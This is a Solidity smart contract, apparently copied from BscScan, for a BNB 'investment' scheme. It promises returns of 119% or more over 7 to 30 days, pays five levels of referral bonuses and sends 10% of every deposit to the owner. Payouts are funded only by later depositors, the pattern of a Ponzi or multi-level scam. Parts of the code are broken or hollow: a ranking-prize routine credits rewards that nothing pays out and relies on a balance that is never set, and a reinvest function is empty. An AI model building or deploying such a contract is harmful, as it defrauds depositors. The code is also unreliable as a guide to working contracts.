/**
 *Submitted for verification at BscScan.com on 2021-12-04
*/

/**
 *Submitted for verification at BscScan.com on 2021-11-24
*/

// SPDX-License-Identifier: MITLICENCE
pragma solidity >=0.8.0;

struct Tarif {
  uint8 life_days;
  uint8 percent;
}

struct Deposit {
  uint8 tarif;
  uint256 amount;
  uint40 time;
}

struct Player {
  address upline;
  uint256 dividends;
  uint256 match_bonus;
  uint40 last_payout;
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_match_bonus;
  Deposit[] deposits;
  uint256[5] structure; 
}

contract Demoapp {
    	using SafeMath for uint256;
    address public owner;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    
    uint8 constant BONUS_LINES_COUNT = 5;
    uint16 constant PERCENT_DIVIDER = 1000; 
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [50, 30, 20, 10, 5]; 

    mapping(uint8 => Tarif) public tarifs;
    mapping(address => Player) public players;
	mapping(uint256 => mapping(address => uint256)) public investors;
	mapping(uint256 => address[8]) public investorsRank;
    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    	uint256 constant public INVEST_MIN_AMOUNT = 100000000000000000;
uint256 public timePointer;
mapping (address => mapping (address => uint256)) public prizes;
	uint256 constant public INVEST_MIN_FORREWARD = 3000000000000000000;
    	mapping(uint256=>mapping(address=>bool)) public settleStatus;
        	 uint256[8] public rankPercent = [300,150,100,100,100,50,50,50];
              mapping(address=>uint256) public debts;
               uint256 public bnbBucketinvestor; 
uint256 public startUNIX;
    constructor() {
        owner = msg.sender;

        uint8 tarifPercent = 119;
        for (uint8 tarifDuration = 7; tarifDuration <= 30; tarifDuration++) {
            tarifs[tarifDuration] = Tarif(tarifDuration, tarifPercent);
            tarifPercent+= 5;
        }
         startUNIX =block.timestamp;
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;
         players[owner].total_match_bonus += _amount;  
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != owner) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= 0.01 ether, "Minimum deposit amount is 0.01 BNB");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);


		
		
		 investors[duration()][msg.sender] = investors[duration()][msg.sender].add(msg.value); 
 
     	_updateInvestorRanking(msg.sender);
     	
        payable(owner).transfer(msg.value / 10);
        
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
     	function duration() public view returns(uint256){
        return duration(startUNIX);
    }
      function _updateInvestorRanking(address userAddress) private {
        address[8] memory rankingList = investorsRank[duration()];
        
        
        (uint256 sn,uint256 minPerformance) = shootOut(rankingList,userAddress);
        if(sn!=8){
            if(minPerformance<investors[duration()][userAddress]){
                rankingList[sn] = userAddress;
            }
            investorsRank[duration()] = rankingList;
        }
    }

	
	
	function settlePerformance() public {
        
        if(timePointer<duration()){
            address[8] memory ranking = sortRanking(timePointer);
          if(!settleStatus[timePointer][address(this)]){
            uint256 bonus;
            for(uint8 i= 0;i<8;i++){
                
                if(ranking[i]!=address(0)){
                    uint256 refBonus = availableBalanceInvestor(address(this)).mul(rankPercent[i]).div(1000);
                
                    prizes[address(this)][ranking[i]] = prizes[msg.sender][ranking[i]].add(refBonus);
                    bonus = bonus.add(refBonus);
                    
                    
                }
                
            }
            debts[msg.sender] = debts[msg.sender].add(bonus);
            settleStatus[timePointer][msg.sender] = true;
            
            
            
            
        }
        }
    }
    	function availableBalanceInvestor(address userAddress) public view returns(uint256){
        
        if(bnbBucketinvestor>debts[userAddress]){
            return bnbBucketinvestor.sub(debts[userAddress]);
        }
        else{
            return 0;
        }
    }
	
    function sortRanking(uint256 _duration) public view returns(address[8] memory ranking){
       
        ranking=investorsRank[_duration];
        address tmp;
        for(uint8 i = 1;i<8;i++){
            for(uint8 j = 0;j<8-i;j++){
                if(investors[_duration][ranking[j]]<investors[_duration][ranking[j+1]]){
                    tmp = ranking[j];
                    ranking[j] = ranking[j+1];
                    ranking[j+1] = tmp;
                }
            }
        }
        
        return ranking;
    }
     function shootOut(address[8] memory rankingList,address userAddress) public view returns (uint256 sn,uint256 minPerformance){
        
        minPerformance = investors[duration()][rankingList[0]];
        for(uint8 i =0;i<8;i++){
            if(rankingList[i]==userAddress){
                return (8,0);
            }
            if(investors[duration()][rankingList[i]]<minPerformance){
                minPerformance =investors[duration()][rankingList[i]];
                sn = i;
            }
        }
        
        return (sn,minPerformance);
    }
    
    function duration(uint256 startTime) public view returns(uint256){
        if(block.timestamp<startTime){
            return 0;
        }else{
            
            
            return block.timestamp.sub(startTime).div(1 days);
         
            
        }
    }
    function withdraw() external {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.match_bonus;

        player.dividends = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        payable(msg.sender).transfer(amount);
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }


    
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[BONUS_LINES_COUNT] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus) {
        return (invested, withdrawn, match_bonus);
    }

    function reinvest() external {
      
    }

    function invest() external payable {
      payable(msg.sender).transfer(msg.value);
    }

    function invest(address to) external payable {
      payable(to).transfer(msg.value);
    }

}
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}